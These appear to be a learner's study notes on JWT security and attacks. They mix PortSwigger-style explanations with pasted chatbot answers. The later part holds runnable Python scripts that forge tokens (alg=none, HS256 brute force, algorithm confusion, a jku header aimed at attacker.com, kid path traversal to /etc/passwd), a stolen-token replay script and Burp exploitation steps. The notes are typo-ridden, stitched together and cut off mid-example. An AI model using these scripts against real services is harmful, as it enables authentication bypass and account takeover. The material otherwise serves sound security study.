


What are JWTs?
JSON web tokens (JWTs) is standardized way for sending cryptographically signed JSON data between systems. end information ("claims") of users as part of authentication, session handling, and access control mechanisms. 

A JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot, as shown in the following example: 

eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA

The header and payload parts of a JWT are just base64url-encoded JSON objects. The header contains metadata about the token itself, while the payload contains the actual "claims" about the user. For example, you can decode the payload from the token above to reveal the following claims: 
{ "iss": "portswigger", "exp": 1648037164, "name": "Carlos Montoya", "sub": "carlos", "role": "blog_author", "email": "carlos@carlos-montoya.net", "iat": 1516239022 }

In most cases, this data can be easily read or modified by anyone with access to the token. Therefore, the security of any JWT-based mechanism is heavily reliant on the cryptographic signature. 

JWT signature
Server send the JWT with help of Secret key (Signature) by hashing the Header & Payload. None of Data can't be tampered because as the signature derived from token  by changing the single byte of header or payload as result in mismatch in signature & Without knowing the server's secret signing key, it shouldn't be possible to generate the correct signature for a given header or payload. 



JWT vs JWS vs JWE

JWT define formation information (claims) as in JSON object it transfer between two parties. JWT spec is extented by JSON Web Signature (JWS) and JSON Web Encryption (JWE) means JWT usally a JWS or JWE token,
When people use the term "JWT", they almost always mean a JWS token. JWEs are very similar, except that the actual contents of the token are encrypted rather than just encoded. 

JWS and JWE are both part of the JSON Web Token (JWT) ecosystem defined by the IETF. They are used for securing data—but in different ways.

🔐 JWS (JSON Web Signature)
Purpose: Ensure integrity + authenticity (data is not tampered and sender is verified)
👉 With JWS:
    • Data is signed, NOT encrypted
    • Anyone can read the payload
    • But they can’t modify it without breaking the signature
📌 How it works:
    • Header + Payload + Signature
    • Signature created using:
        ○ Secret key (HMAC)
        ○ Public/Private key (RSA, ECDSA)
📌 Example use:
    • Authentication tokens (login sessions)
    • API authorization (Bearer tokens)
✅ Key benefit:
✔ Detects tampering
✔ Verifies sender
❌ Payload is visible (not confidential)

🔒 JWE (JSON Web Encryption)
Purpose: Ensure confidentiality (data is hidden/encrypted)
👉 With JWE:
    • Data is encrypted
    • Only the intended receiver can decrypt and read it
📌 How it works:
    • Header + Encrypted Key + IV + Ciphertext + Auth Tag
📌 Example use:
    • Sensitive data transmission (PII, banking data)
    • Secure API communication
✅ Key benefit:
✔ Keeps data secret
✔ Prevents unauthorized access

⚡ JWS vs JWE (Simple Comparison)
Feature	JWS 📝	JWE 🔐
Purpose	Signature	Encryption
Data readable?	Yes	No
Security focus	Integrity + Authenticity	Confidentiality
Use case	Auth tokens	Sensitive data
Performance	Faster	Slightly slower

🧠 Easy way to remember:
    • JWS = Signed → “Trust it”
    • JWE = Encrypted → “Hide it”

🚀 Real-world scenario (important for interviews)
    • Login token → JWS
    • Sending Aadhaar / payment data → JWE
    • High security systems → JWE + JWS together



What are JWT attacks?
JWT attack means modified JWTs to server to achieve a malicious goal which means bypass the Authentication & access control.

What is the impact of JWT attacks?
The Impact of JWT attack cause very severe to system, if attacker can able to create own valid token then to escalate their own privileges or impersonate other users, taking full control of their accounts. 


How do vulnerabilities to JWT attacks arise?
JWT vulnerabilities typically arise due to flawed JWT handling within the application itself. Typically low handling the design code in terms of JWT , using battle hardend Libraries

This arise Signature of JWT is not verified properly and attacker can generate a valid signature for any arbitrary token, compromising the entire mechanism. 



#JWT Authentication bypass via unverified signature


Server don't store the JWT because this there is less possible is who is actual user? If don't verified the signature properly then nothing one can stop from attacking
Eg:
JWT containing the following claims: 
{ "username": "carlos", "isAdmin": false }
I
If the server identifies the session based on this username, modifying its value might enable an attacker to impersonate other logged-in users. Similarly, if the isAdmin value is used for access control, this could provide a simple vector for privilege escalation. 

Accepting arbitrary signatures
JWT libraries typically provide one method for verifying tokens and another that just decodes them. For example, the Node.js library jsonwebtoken has verify() and decode(). 
Occasionally, developers confuse these two methods and only pass incoming tokens to the decode() method. This effectively means that the application doesn't verify the signature at all. 



Takeway:
    1. You can add any payload which suitable for attack
    Eg: Sub : Wiener then to administrator
    2. No Signature verified
    3. Accepting arbitrary signatures happens when developers use decode() instead of verify() in JWT libraries. Since decode() does not validate the signature, attackers can forge tokens with modified payloads like admin access. This leads to complete authentication bypass. The fix is to always use verify() and validate claims like exp, iss, and aud.


# JWT authentication bypass via flawed signature verification

In JWT header contains alg parameter, alg tell server which alg was used to sign the token & alg it need to use when verifying the signature
{ "alg": "HS256", "typ": "JWT" }
JWTs can be signed using a range of different algorithms, but can also be left unsigned. **In this case, the alg parameter is set to none, which indicates a so-called "unsecured JWT"**. This make ,servers usually reject tokens with no signature. However, as this kind of filtering relies on string parsing, you can sometimes bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings. 


Takeway:
    1. Select the header of the JWT, **then use the Inspector to change the value of the alg parameter to none.** Click Apply changes. 
    
    
    
# JWT authentication bypass via weak signing key (Brute-forcing secret keys)

IF JWT use algorithms, such as HS256 (HMAC + SHA-256)  then we get secret key it will like the password this secrert can guess by Brute Force.
**This attack only perfrom when algo is HS256 not on RS256**
beacause RS256 use Public Key to sign the token and Private Key to verify the token
Short answer: **Yes—but in different ways.**
Weak signing keys mainly affect **HS256**, while **RS256** has different (but still real) misconfiguration risks.

Let’s break it down clearly 👇

---

# 🔐 1. HS256 (Symmetric) — YES, weak key = easy bypass

### 📘 How HS256 works:

* Same **secret key** is used to:

  * sign the token
  * verify the token

### 🚨 If the secret is weak:

Example:

```
secret = "password123"
```

👉 An attacker can:

* Brute-force the secret (like your script 👆)
* Re-sign a modified token
* Bypass authentication

### 🔥 Attack Type:

* **JWT Secret Brute Force**

### 💡 Real impact:

* Change `"sub": "user"` → `"sub": "admin"`
* Re-sign → access admin APIs

---

# 🔐 2. RS256 (Asymmetric) — NOT via weak “secret”, BUT misconfig = bypass

### 📘 How RS256 works:

* Uses **two keys**:

  * Private key → signing
  * Public key → verification

👉 No shared secret → brute-force doesn’t apply like HS256 ❌

---

## 🚨 BUT attacks still exist (important for interviews)

### 🔥 1. Algorithm Confusion Attack

* Server expects RS256
* Attacker changes:

```json
"alg": "HS256"
```

* Uses **public key as HMAC secret**

👉 If server is misconfigured:

* It treats public key as secret
* Token gets accepted ✅

---

### 🔥 2. Weak Public Key Handling

* If public key is exposed (common)
* AND server incorrectly validates → exploit possible

---

### 🔥 3. `alg=none` Attack (legacy/misconfig)

* Remove signature completely
* If server allows → bypass

---

# 🧠 Comparison (Very Important)

| Feature              | HS256         | RS256          |
| -------------------- | ------------- | -------------- |
| Key type             | Shared secret | Public/Private |
| Weak key attack      | ✅ YES         | ❌ NO           |
| Brute force possible | ✅             | ❌              |
| Misconfig attacks    | ✅             | ✅              |
| Algorithm confusion  | ⚠️ possible   | ⚠️ VERY common |

---

# 🎯 Interview Answer (Best Way to Say)

👉 If asked:

**“Can JWT be bypassed via weak signing key?”**

Answer like this:

> In HS256, yes—because it uses a shared secret. If the secret is weak, it can be brute-forced and used to re-sign tokens.
> In RS256, weak secret brute force is not applicable since it uses asymmetric keys. However, misconfigurations like algorithm confusion or improper key validation can still lead to authentication bypass.

---

Brute-forcing secret keys using hashcat


Takeway:
    1. Always use for encode and verify different different Secret key
    2. Secret key find from Hashcat or JWT_Tool

JWT Crack Attack
APISec Unviveristy
The JWT Crack attack attempts to crack the secret used for the JWT signature hash, giving us full control over the process of creating our own valid JWTs. Hash-cracking attacks like this take place offline and do not interact with the provider. You can use JWT_Tool or a tool like Hashcat to crack JWT secrets. You’ll feed your hash cracker a list of words.  let's use Crunch, a password-generating tool, to create a list of all possible character combinations to use against crAPI.
$crunch 5 5 -o crAPIpw.txt



We can use this password file that contains all possible character combinations created for 5 character passwords against our crAPI token. To perform a JWT Crack attack using JWT_Tool, use the following command: $ jwt_tool TOKEN -C -d /wordlist.txt The -C option indicates that you’ll be conducting a hash crack attack, and the -d option specifies the dictionary or wordlist you’ll be using against the hash. JWT_Tool will either return “CORRECT key!” for each value in the dictionary or indicate an unsuccessful attempt with “key not found in dictionary.”



Encode the JWT using jwt.io

Take another emailID & signuture u know "crapi"


## JWT header parameter injections

🧠 First: Difference between HS256 and RS256
🔑 HS256 (Symmetric)
One secret key
sign + verify = SAME secret
🔐 RS256 (Asymmetric)
Two keys
Private key → sign  
Public key → verify
🎯 Now: Which header parameter is used where?
🔑 HS256 (what is actually used)

👉 Mostly uses: kid

Why?

Because server may have multiple secrets:

key1 → secret123  
key2 → secret456  

So JWT:

{ "alg": "HS256", "kid": "key1" }

👉 Server uses kid to select secret

💥 Vulnerability in HS256

If server trusts kid:

👉 Attacker changes:

{ "alg": "HS256", "kid": "mysecret" }

👉 Then signs token using:

secret = "mysecret"

👉 If server uses that → ✅ bypass

❗ Important

👉 jku and jwk are NOT commonly used in HS256

🔐 RS256 (what is actually used)

👉 Uses:

jku ✅
jwk ✅
kid ✅
Why?

Because server needs public key to verify

💥 Vulnerabilities in RS256
1. 🌐 jku (most common)
{ "alg": "RS256", "jku": "https://attacker.com/key.json" }

👉 Server downloads key → attacker controls it → 💥

2. 📦 jwk
{ "alg": "RS256", "jwk": { attacker public key } }

👉 Server uses embedded key → 💥

3. 🔑 kid
{ "alg": "RS256", "kid": "key1" }

👉 Used to select correct public key
👉 Can be abused if lookup is weak

⚠️ Important: Algorithm Confusion

👉 Happens between HS256 ↔ RS256

Example:

{ "alg": "HS256" }

👉 Server expected RS256
👉 Attacker uses public key as secret
👉 💥 bypass

🧠 Final Simple Table
| Feature         | HS256                    | RS256                          |
|-----------------|--------------------------|---------------------------------|
| Key type        | Same secret              | Public/Private                  |
| Main parameter  | kid                      | jku, jwk, kid                   |
| Attack type     | Secret confusion via kid | Key injection via URL/key       |
| Risk level      | Medium                   | High                            |

🧠 One Line Summary

👉 **HS256 → attack by controlling secret (kid)**
👉**R256 → attack by controlling public key (jku, jwk)**


Let’s make this **very simple and practical**—no heavy theory 👍

---

# 🧠 Core Idea (remember this)

👉 **JWT header tells the server which key to use**
👉 If the server trusts this header → attacker can **control the key**
👉 Then attacker can **create valid fake tokens** 💥

---

# 🔐 Normal (secure) behavior

Server should do:

```text
Always use my own trusted key
Ignore user-controlled header for key selection
```

---

# 🚨 Vulnerable behavior

Server does:

```text
Read JWT header → decide key from kid/jku/jwk
```

👉 Problem:
**JWT header = attacker input 😳**

---

# 🎯 Simple Example (step-by-step)

---

## ✅ 1. Normal JWT

```json
Header:
{ "alg": "HS256", "kid": "key1" }

Payload:
{ "user": "atish", "role": "user" }
```

Server:

```text
kid = key1 → use secret "secret123"
```

---

## 💥 2. Attacker modifies JWT

```json
Header:
{ "alg": "HS256", "kid": "mykey" }

Payload:
{ "user": "atish", "role": "admin" }
```

---

## 🔑 3. Attacker signs token

```text
secret = "mykey"
```

---

## 🤯 4. Vulnerable server does

```text
kid = "mykey" → uses "mykey" as secret
→ verifies token
→ ACCEPTED ✅
```

---

## 🎉 Result

👉 Attacker becomes **admin**
👉 **JWT authentication bypass**

---

# 🔥 Same concept for all parameters

---

## 🔑 `kid`

👉 “Use this key ID”
➡ attacker changes it

---

## 🌐 `jku`

👉 “Download key from this URL”
➡ attacker gives own URL → server fetches attacker key

---

## 📦 `jwk`

👉 “Here is the key, use it”
➡ attacker embeds their own key

---

# 🧠 One Line Memory Trick

> **Server trusts attacker to verify attacker → security broken**

---

# ⚡ Interview Answer (Simple & Strong)

> JWT header parameter injection occurs when the server trusts user-controlled header fields like kid, jku, or jwk to select the verification key. An attacker can manipulate these values to make the server use their own key, allowing them to sign tokens and bypass authentication.

---


Got it 👍 — let’s explain each in the **simplest possible way with tiny examples**.

---

# 🧠 Think like this first

👉 JWT header is like telling the server:
**“Use THIS key to verify me”**

👉 These 3 parameters are just **different ways to tell which key to use**

---

# 🔑 1. `kid` (Key ID) — **“Pick key by name”**

### 📌 Simple meaning:

👉 “Use the key with this ID”

---

### 🧾 Example:

```json
{ "alg": "HS256", "kid": "key1" }
```

👉 Server:

```text
key1 → secret123
```

---

### 😈 Attack idea:

```json
{ "kid": "mykey" }
```

👉 If server trusts it:

```text
mykey → attacker secret
```

👉 💥 attacker controls key

---

# 🌐 2. `jku` (Key URL) — **“Download key from this link”**

### 📌 Simple meaning:

👉 “Go to this URL and get the key”

---

### 🧾 Example:

```json
{ "alg": "RS256", "jku": "https://trusted.com/keys.json" }
```

👉 Server:

```text
Download key from URL → verify token
```

---

### 😈 Attack idea:

```json
{ "jku": "https://attacker.com/keys.json" }
```

👉 Server:

```text
Downloads attacker key 😳
```

👉 💥 attacker controls key

---

# 📦 3. `jwk` (Key inside token) — **“Here is the key itself”**

### 📌 Simple meaning:

👉 “I am giving you the key directly”

---

### 🧾 Example:

```json
{
  "alg": "RS256",
  "jwk": { "public_key": "XYZ..." }
}
```

👉 Server uses this key to verify

---

### 😈 Attack idea:

👉 Attacker puts their own key:

```json
"jwk": { attacker_key }
```

👉 💥 server uses attacker key

---

# 🧠 Super Simple Comparison

| Parameter | Meaning            | Easy Memory    |
| --------- | ------------------ | -------------- |
| `kid`     | Pick key by ID     | “Use key1”     |
| `jku`     | Fetch key from URL | “Download key” |
| `jwk`     | Key inside token   | “Here is key”  |

---

# ⚠️ Why this is dangerous

👉 All 3 are **controlled by attacker (JWT header)**

If server trusts them:

```text
Attacker → chooses key → signs token → server accepts
```

👉 💥 **Authentication bypass**

---

# ⚡ One Line Answer (Interview)

> kid selects a key by ID, jku provides a URL to fetch keys, and jwk embeds the key directly in the token. If the server trusts these user-controlled values, an attacker can make the server use their own key and bypass authentication.

---

The **JOSE Header** is a part of a JWT (JSON Web Token) that tells **how the token is created and how it should be verified**.

---

# 🔐 What is JOSE Header?

**JOSE = JSON Object Signing and Encryption**

A JWT has 3 parts:

```
Header.Payload.Signature
```

The **JOSE Header** is the **first part (Header)**.

---

# 📦 Example JOSE Header

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

---

# 🧠 Meaning of fields

| Field | Meaning                                         |
| ----- | ----------------------------------------------- |
| `alg` | Algorithm used for signing (e.g., HS256, RS256) |
| `typ` | Type of token (usually JWT)                     |

---

# 🔥 Advanced JOSE Header Example

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "abc123",
  "jku": "https://example.com/keys.json"
}
```

---

# 📌 Important Parameters (related to your table)

| Parameter | Purpose                                  |
| --------- | ---------------------------------------- |
| `kid`     | Select which key to use for verification |
| `jku`     | URL to fetch public keys                 |
| `jwk`     | Embedded public key inside token         |

---

# ⚠️ Security Importance (VERY IMPORTANT for interviews)

JOSE Header is **NOT encrypted** ❗
Anyone can read and modify it.

### Common attacks:

* `alg: none` attack → bypass signature
* Changing `alg` from RS256 → HS256
* Malicious `jku` URL (attacker-controlled key)

---

# 🎯 Simple Understanding

👉 Think of JOSE Header like:

> “Instructions on how to verify this token”

---

# 💡 Real-world usage

Used in:

* OAuth2
* OpenID Connect
* API Authentication systems

---
Good question—this is a **very important JWT attack concept** for interviews and real-world security.

Let’s break it down clearly using **HS256 vs RS256** 👇

---

# 🔐 First: What is happening here?

You showed a JWT with a **`jwk` parameter inside the JOSE header**.

👉 Normally:

* Server has **trusted keys**
* It verifies JWT using those keys

👉 But here:

* The token itself says:
  **“Hey server, use THIS key (inside jwk) to verify me”**

⚠️ If the server blindly trusts this → **Vulnerability**

---

# 🔁 HS256 vs RS256 (Core Difference)

| Algorithm | Type       | Key Usage                                |
| --------- | ---------- | ---------------------------------------- |
| HS256     | Symmetric  | Same secret for sign + verify            |
| RS256     | Asymmetric | Private key (sign) + Public key (verify) |

---

# 🔥 Case 1: RS256 (Where this attack works)

### 🧠 Normal Flow

1. Server signs JWT using **private key**
2. Server verifies using **public key**

---

### ❌ Vulnerable Flow with `jwk`

Attacker:

1. Generates **their own RSA key pair**
2. Puts **their public key inside `jwk`**
3. Signs token using **their private key**

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "attacker-modulus",
    "e": "AQAB"
  }
}
```

👉 If server trusts `jwk`:

* It uses attacker’s public key
* Signature becomes **VALID**

💥 Result:

> Attacker creates **self-signed JWT** → **Authentication bypass**

---

# 🔥 Case 2: HS256 (Why different)

### 🧠 Normal Flow

* Same **secret key** used for signing + verification

---

### ❌ Attack Possibility?

`jwk` attack is **less relevant for HS256** because:

* Server needs a **shared secret**
* Not a public key

BUT…

---

# 💣 HS256 Confusion Attack (Related)

If server supports both:

* RS256
* HS256

Attacker can:

1. Change:

```json
"alg": "RS256" → "HS256"
```

2. Use **server’s public key as HMAC secret**

👉 Since public key is known:

* Attacker can sign token using it
* Server verifies using same key

💥 Result:

> Signature becomes valid → **Bypass**

---

# 🧠 Key Difference Summary

| Scenario        | RS256                      | HS256                |
| --------------- | -------------------------- | -------------------- |
| Uses `jwk`      | ✅ Vulnerable if trusted    | ❌ Not typical        |
| Self-signed JWT | ✅ Possible                 | ❌ Not direct         |
| Key control     | Public key can be injected | Secret must be known |
| Main risk       | jwk injection              | Algorithm confusion  |

---

# ⚠️ Why `jwk` is dangerous

If server does this:

```pseudo
if (header.jwk exists):
    use header.jwk to verify
```

👉 Then attacker controls verification key

---

# 🛡️ How to prevent

* ❌ Do NOT trust `jwk` from token
* ✅ Use server-side trusted keys only
* ✅ Disable dynamic key loading
* ✅ Enforce algorithm (don’t accept both blindly)

---

# 🎯 Simple Memory Trick

* **RS256 + jwk** → “I bring my own key” → 🚨 Dangerous
* **HS256** → “Secret must match” → safer but confusion risk

---
Let’s break this down **clearly and deeply**, step by step, exactly how this works in real systems and attacks.

---

# 🔐 1. Background: What is `jwk` in JWT?

In a JWT (JWS), the **header (JOSE header)** can optionally include:

```json
"jwk": { ... }
```

👉 This means:

> “Here is the **public key** you should use to verify this token”

---

# 📦 Your Given Header (Explained)

```json
{
  "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
  "typ": "JWT",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
  }
}
```

### Field meaning:

| Field | Meaning                                    |
| ----- | ------------------------------------------ |
| `alg` | Signing algorithm → RS256 (asymmetric RSA) |
| `kid` | Key identifier                             |
| `jwk` | Public key embedded in token               |
| `kty` | Key type → RSA                             |
| `e`   | Public exponent (usually `AQAB` = 65537)   |
| `n`   | Modulus → main part of RSA public key      |

---

# 🔁 2. Normal (Secure) JWT Flow

### Without `jwk`:

1. Server issues JWT
2. Signs with **private key**
3. Client sends token back
4. Server verifies using **trusted public key (stored internally)**

👉 Key point:

> Server controls the key → safe

---

# ⚠️ 3. What changes with `jwk`?

With `jwk`, the token says:

> “Use THIS key (inside me) to verify me”

👉 Now the **key comes from the token itself**

---

# 💣 4. The Vulnerability (Core Issue)

If server logic is like:

```text
if jwk exists in header:
    use jwk to verify signature
```

👉 Then:

* The attacker controls the key
* The attacker controls the signature
* The server trusts both

❌ This breaks the entire trust model

---

# 🔥 5. Attack: Injecting Self-Signed JWT

## Step 1: Attacker generates their own RSA key pair

* Private key → used to sign
* Public key → placed in `jwk`

---

## Step 2: Create malicious payload

Example:

```json
{
  "user": "admin"
}
```

---

## Step 3: Create JWT header with attacker key

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "ATTACKER_PUBLIC_KEY"
  }
}
```

---

## Step 4: Sign JWT

* Use attacker **private key**
* Signature becomes valid for attacker key

---

## Step 5: Send to vulnerable server

---

## Step 6: Server verifies

Server does:

1. Extract `jwk` from token
2. Uses it as public key
3. Verifies signature → ✅ valid

👉 Server thinks:

> “Signature is correct → token is trusted”

❌ But attacker created everything

---

# 🧠 6. Why this works (Important Concept)

This is a **trust boundary failure**.

👉 JWT security assumes:

* Signing key is trusted
* Verification key is trusted

But here:

* Attacker supplies both

---

# 🔍 7. Visual Flow

### Secure:

```text
Server → signs → Client → verifies using trusted key
```

### Vulnerable:

```text
Attacker → creates token + key → Server trusts attacker key → access granted
```

---

# ⚠️ 8. Real-world impact

If exploited, attacker can:

* Become **admin**
* Bypass authentication
* Access protected APIs
* Impersonate any user

---

# 🛡️ 9. How to prevent this

### ✅ Correct approach:

* Ignore `jwk` in header
* Use only:

  * Hardcoded public key
  * Trusted JWKS endpoint (controlled)

---

### ❌ Never do:

```text
use token.header.jwk directly
```

---

# 🔗 10. Related attacks (connect this topic)

* `jku` injection → fetch key from attacker URL
* `kid` manipulation → trick key lookup
* `alg` confusion → change algorithm

---

# 🎯 11. Interview-ready explanation

> “In jwk injection, an attacker embeds their own public key inside the JWT header and signs the token with the corresponding private key. If the server trusts the jwk from the token, it verifies the signature using the attacker’s key, allowing full token forgery.”

---

now let say for JWT we dont get any jwk. jku, kid then what to do to get it?

Short answer: **you don’t “get” `jwk` / `jku` / `kid` from the server if they aren’t there—you try to *introduce or influence them*** and see how the server behaves.

Let’s go step by step, in a practical pentesting mindset.

---

# 🔍 1. First: Understand what you have

If your JWT header looks like:

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

👉 Then:

* No key reference is exposed
* Server is likely using **internal key storage**

---

# 🎯 2. What you should try (real testing approach)

## ✅ Test 1: Add `kid` manually

Modify header:

```json
{
  "alg": "RS256",
  "kid": "test"
}
```

👉 Why?

* Some servers use `kid` to **lookup keys**
* If vulnerable → may allow:

  * Path traversal (`../../key`)
  * SQL injection (rare but possible)
  * Key confusion

---

## ✅ Test 2: Inject your own `jwk`

Even if not present originally, try adding:

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "YOUR_PUBLIC_KEY"
  }
}
```

👉 Goal:

* Check if server **accepts attacker-supplied key**

### Result:

* ✅ If accepted → **critical vulnerability**
* ❌ If ignored → server is safe (for this vector)

---

## ✅ Test 3: Add `jku` (external key URL)

```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"
}
```

👉 Host your own JWKS file:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "n": "YOUR_PUBLIC_KEY"
    }
  ]
}
```

👉 Goal:

* Check if server fetches keys from your URL

---

# 🔥 3. Important mindset (this is key)

👉 These parameters are:

* **Optional**
* **Attacker-controlled**

So even if they are not present:

> You can still **add them manually and test behavior**

---

# 🧠 4. What decides success?

It depends on server implementation:

| Behavior                | Result        |
| ----------------------- | ------------- |
| Ignores unknown headers | ❌ Safe        |
| Uses `jwk` from token   | 💣 Vulnerable |
| Fetches from `jku`      | 💣 Vulnerable |
| Uses `kid` insecurely   | 💣 Vulnerable |

---

# ⚠️ 5. Don’t forget this (very important)

If none of these work, try other JWT attacks:

### 🔹 Algorithm confusion

Change:

```json
"alg": "RS256" → "HS256"
```

Use public key as HMAC secret

---

### 🔹 `alg: none` attack

```json
"alg": "none"
```

(remove signature)

---

### 🔹 Weak secret (HS256)

Bruteforce secret key

---

# 🔎 6. Real pentesting workflow

1. Decode JWT
2. Identify algorithm
3. Try:

   * Add `kid`
   * Add `jwk`
   * Add `jku`
4. Re-sign token
5. Send request
6. Observe response

---

# 🎯 Final Answer (Interview-ready)

> “If `jwk`, `jku`, or `kid` are not present in a JWT, an attacker can still try injecting them manually in the header to test whether the server improperly trusts these parameters. If the server uses attacker-controlled values for key selection or verification, it can lead to JWT forgery.”

---

If you want, I can next:
✅ Show **exact Burp Suite steps (with screenshots logic)**
✅ Give **ready Python script to generate jwk attack token**
✅ Provide **PortSwigger lab solution walkthrough**


Good — now we’re moving from theory → real operator level.

I’ll give you **practical, field-ready material** used by experienced AppSec testers:

* ✅ Python attack scripts (modular & reusable)
* 🔥 Burp Suite exploitation workflows (exact steps you follow in real pentest)

---

# 🐍 PART 1 — REAL-WORLD JWT ATTACK SCRIPTS (PYTHON)

We’ll use:

* `pyjwt`
* `requests`
* `base64`

Install:

```bash
pip install pyjwt requests
```

---

## 🔴 1. NONE Algorithm Attack Script

```python
import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

encoded_header = base64url_encode(json.dumps(header).encode())
encoded_payload = base64url_encode(json.dumps(payload).encode())

token = f"{encoded_header}.{encoded_payload}."

print("Forged Token:\n", token)
```

👉 Use this token in:

* Authorization header
* Cookies

---

## 🔴 2. HS256 Brute Force Script

```python
import jwt

token = input("Enter JWT: ")

wordlist = ["secret", "admin", "password", "123456"]

for secret in wordlist:
    try:
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"[+] Secret Found: {secret}")
        print(decoded)
        break
    except:
        pass
```

👉 Replace wordlist with `rockyou.txt` for real attack

---

## 🔴 3. Algorithm Confusion Attack (RS256 → HS256)

```python
import jwt

public_key = open("public.pem").read()

payload = {
    "user": "admin",
    "role": "admin"
}

token = jwt.encode(payload, public_key, algorithm="HS256")

print("Forged Token:\n", token)
```

👉 Key insight:

* Using **public key as HMAC secret**

---

## 🔴 4. JKU Attack Script (JWKS Injection)

```python
import jwt

payload = {
    "user": "admin"
}

headers = {
    "jku": "http://attacker.com/jwks.json",
    "kid": "evil-key"
}

private_key = open("private.pem").read()

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)

print(token)
```

👉 You must host:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "evil-key",
      "n": "...",
      "e": "AQAB"
    }
  ]
}
```

---

## 🔴 5. KID Injection Attack (File Read)

```python
import jwt

payload = {
    "user": "admin"
}

headers = {
    "kid": "../../../../../../etc/passwd"
}

secret = "dummy"

token = jwt.encode(payload, secret, algorithm="HS256", headers=headers)

print(token)
```

👉 Try variations:

* `../../../proc/self/environ`
* SQL injection payloads

---

## 🔴 6. Token Replay Script

```python
import requests

url = "https://target.com/api"

token = input("Enter stolen JWT: ")

headers = {
    "Authorization": f"Bearer {token}"
}

r = requests.get(url, headers=headers)

print(r.status_code)
print(r.text)
```

---

# 🔥 PART 2 — BURP SUITE STEP-BY-STEP EXPLOITATION GUIDE

Using **Burp Suite**

---

## 🧪 STEP 1 — Capture JWT

1. Open Burp → Proxy ON
2. Login to application
3. Go to:

   * HTTP history
   * Look for:

     * `Authorization: Bearer <token>`
     * Cookies

---

## 🧪 STEP 2 — Send to Repeater

* Right click → **Send to Repeater**

---

## 🔴 ATTACK 1 — NONE Algorithm

### Steps:

1. Decode JWT (use Decoder tab)
2. Modify header:

```json
{
  "alg": "none"
}
```

3. Change payload:

```json
{
  "user": "admin"
}
```

4. Remove signature → keep trailing dot

5. Send request

👉 If success → **CRITICAL VULN**

---

## 🔴 ATTACK 2 — CLAIM MANIPULATION

1. Modify payload:

```json
{
  "role": "admin"
}
```

2. Keep original signature
3. Send request

👉 If accepted → **No signature validation**

---

## 🔴 ATTACK 3 — KID Injection

1. Modify header:

```json
{
  "kid": "../../../../etc/passwd"
}
```

2. Send request

👉 Watch for:

* 500 errors
* Response differences

---

## 🔴 ATTACK 4 — JKU Injection

1. Modify header:

```json
{
  "jku": "http://your-server/jwks.json"
}
```

2. Host malicious JWKS
3. Sign token with your private key
4. Send request

👉 If accepted → **Auth bypass**

---

## 🔴 ATTACK 5 — ALGORITHM CONFUSION

1. Change:

```json
"alg": "HS256"
```

2. Sign using public key
3. Replace token in request
4. Send

---

## 🔴 ATTACK 6 — BRUTE FORCE (BURP)

Use:

* Extensions:

  * **JWT Editor**
  * **Turbo Intruder**

Steps:

1. Send token to Intruder
2. Use wordlist
3. Monitor valid responses

---

# 🧠 PRO TIPS (FROM REAL PENTESTING)

### ✔️ Always check:

* `alg`
* `kid`
* `jku`
* `x5u`


** how we come to knoe that jwk keader injectino is possible here? **

That’s the right question — this is exactly what separates a beginner from a real pentester.

You don’t randomly try JWK injection. You identify signals that tell you it might work.

Let’s break it down like a senior AppSec engineer would during a real test.

🧠 HOW DO YOU KNOW JWK HEADER INJECTION IS POSSIBLE?

You infer it from behavior + misconfig clues, not guess blindly.

🔍 1. FIRST CLUE — JWT HEADER ANALYSIS

You decode the token (in Burp Suite or manually):

{
  "alg": "RS256",
  "kid": "2eac68af-910b-4804-ad61-351b9db23a52"
}
🚨 What should trigger your brain?
✅ RS256 algorithm
Means asymmetric crypto
Server uses public key to verify

👉 That opens door for:

JWK injection
JKU attack
Key confusion
✅ Presence of kid
"kid": "some-id"

👉 This is a BIG signal

Why?

Server likely:

Uses kid to select key dynamically
Fetches key from:
DB
File system
Remote JWKS endpoint

👉 Dynamic key lookup = attack surface

🔍 2. SECOND CLUE — SERVER BEHAVIOR TESTING

Now you don’t assume — you probe

🧪 Test 1 — Add JWK Header

Modify token header:

{
  "alg": "RS256",
  "kid": "2eac...",
